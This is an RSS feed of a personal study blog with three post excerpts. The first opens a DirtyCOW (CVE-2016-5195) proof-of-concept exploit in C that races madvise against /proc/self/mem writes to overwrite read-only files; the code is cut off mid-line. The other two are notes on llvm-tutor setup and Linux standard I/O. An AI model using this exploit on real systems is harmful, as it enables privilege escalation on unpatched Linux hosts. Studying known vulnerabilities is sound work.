<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on a39&#39;s blog</title>
    <link>https://asuka39.github.io/posts/</link>
    <description>Recent content in Posts on a39&#39;s blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-gb</language>
    <lastBuildDate>Thu, 04 Apr 2024 00:00:00 +0000</lastBuildDate><atom:link href="https://asuka39.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>CVE-2016-5195 DirtyCOW</title>
      <link>https://asuka39.github.io/posts/dirtycow/</link>
      <pubDate>Thu, 04 Apr 2024 00:00:00 +0000</pubDate>
      
      <guid>https://asuka39.github.io/posts/dirtycow/</guid>
      
      <description>PoC 修改自dirtycow.github.io #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;sys/mman.h&amp;gt; #include &amp;lt;fcntl.h&amp;gt; #include &amp;lt;pthread.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;sys/stat.h&amp;gt; #include &amp;lt;string.h&amp;gt; #include &amp;lt;stdint.h&amp;gt; void *map; int f; struct stat st; char *name; void *madviseThread(void *arg) { char *str; str = (char*)arg; int i, c = 0; for(i = 0; i &amp;lt; 100000000; i++) { c += madvise(map, 100, MADV_DONTNEED); } printf(&amp;#34;madvise %d\n\n&amp;#34;, c); } void *procselfmemThread(void *arg) { char *str; str = (char*)arg; int f = open(&amp;#34;/proc/self/mem&amp;#34;, O_RDWR); int i, c = 0; for(i = 0; i &amp;lt; 100000000; i++) { lseek(f, (uintptr_t)map, SEEK_SET); c += write(f, str, strlen(str)); } printf(&amp;#34;procselfmem %d\n\n&amp;#34;, c); } int main(int argc, char *argv[]) { if (argc &amp;lt; 3) { (void)fprintf(stderr, &amp;#34;%s\n&amp;#34;, &amp;#34;usage: dirtyc0w target_file new_content&amp;#34;); return 1; } pthread_t pth1, pth2; f = open(argv[1], O_RDONLY); fstat(f, &amp;amp;st); name = argv[1]; map = mmap(NULL, st.</description>
      
    </item>
    
    <item>
      <title>LLVM Tutor Note</title>
      <link>https://asuka39.github.io/posts/llvm-tutor/</link>
      <pubDate>Sun, 31 Mar 2024 00:00:00 +0000</pubDate>
      
      <guid>https://asuka39.github.io/posts/llvm-tutor/</guid>
      
      <description>本人学习banach-space/llvm-tutor的一点笔记 Environment 首先安装 LLVM-17。Ubuntu 的包版本普遍滞后，22.04 到目前只有 LLVM-14，如果想使用更现代的 LLVM-17 就需要添加第三方源（其实是因为 LLVM project 的 API 更换太频繁到现在都没稳定下来）
Ubuntu 22.04 wget -O - https://apt.llvm.org/llvm-snapshot.gpg.key | sudo apt-key add - sudo apt-add-repository &amp;#34;deb http://apt.llvm.org/jammy/ llvm-toolchain-jammy-17 main&amp;#34; sudo apt update sudo apt install -y llvm-17 llvm-17-dev llvm-17-tools clang-17 安装完就能在/usr/lib/llvm-17找到所需的头文件、库和二进制文件了
推荐给 shell 加个配置 export LLVM_DIR=/usr/lib/llvm-17 如果用的 vscode，建个.vscode后F1输入C++: Edit Configurations (UI)，加上编译器路径、Include Path 和 C++ 标准 Include Path 加上：/usr/include/llvm-17、/usr/include/llvm-c-17 HelloWorld First Taste 编译 HelloWorldPass
cd /path/to/llvm-tutor mkdir build &amp;amp;&amp;amp; cd build cmake -DLT_LLVM_INSTALL_DIR=$LLVM_DIR .</description>
      
    </item>
    
    <item>
      <title>Linux 系统编程笔记</title>
      <link>https://asuka39.github.io/posts/apue/</link>
      <pubDate>Sun, 03 Dec 2023 00:00:00 +0000</pubDate>
      
      <guid>https://asuka39.github.io/posts/apue/</guid>
      
      <description>课程视频：Linux 系统编程 - 李慧琴老师 深入浅出，点面结合，恪守标准，爆赞 参考书目 UNIX 环境高级编程（第三版） Linux 内核设计与实现（第三版） 深入理解 Linux 内核（第三版） 参考文章 Linux系统编程学习笔记 | 来生拓己 オフィシャルサイト 标准 I/O 简介 I/O：input &amp;amp; output stdio：标准 I/O（优先使用，因为可移植性好且封装性好） sysio：系统 I/O（也叫文件 I/O） 常见标准 I/O：
打开/关闭文件 输入输出流 文件指针操作 缓存相关 fopen fgetc，fputc fseek fflush fclose fgets，fputs ftell fread，fwrite rewind printf 族，scanf 族 FILE 类型始终贯穿标准 I/O
fopen FILE *fopen(const char *path, const char *mode) path：文件路径 mode：访问权限 r：只读，文件指针定位到文件开头，要求文件必须存在 r+：可读写，文件指针定位到文件开头，要求文件必须存在 w：只写，有此文件则清空，无此文件则创建文件，文件指针定位到文件开头 w+：可读写，有此文件则清空，无此文件则创建文件，文件指针定位到文件开头 a：只写，追加到文件，无此文件则创建文件，文件指针定位到文件末尾（最后一个字节的下一个位置） a+：可读可追加（可写），无此文件则创建文件，读文件加时文件指针定位到文件开头，追加时文件指针定位到文件末尾 b：以二进制流打开，可以在以上权限后面加此权限（遵循 POSIX 的系统可以忽略，包括 Linux） 若执行成功函数返回一个 FILE 指针，失败则返回 NULL 并设置全局变量errno errno的定义在 /usr/include/asm-generic的宏中，若想使用需包含errno.</description>
      
    </item>
    
  </channel>
</rss>
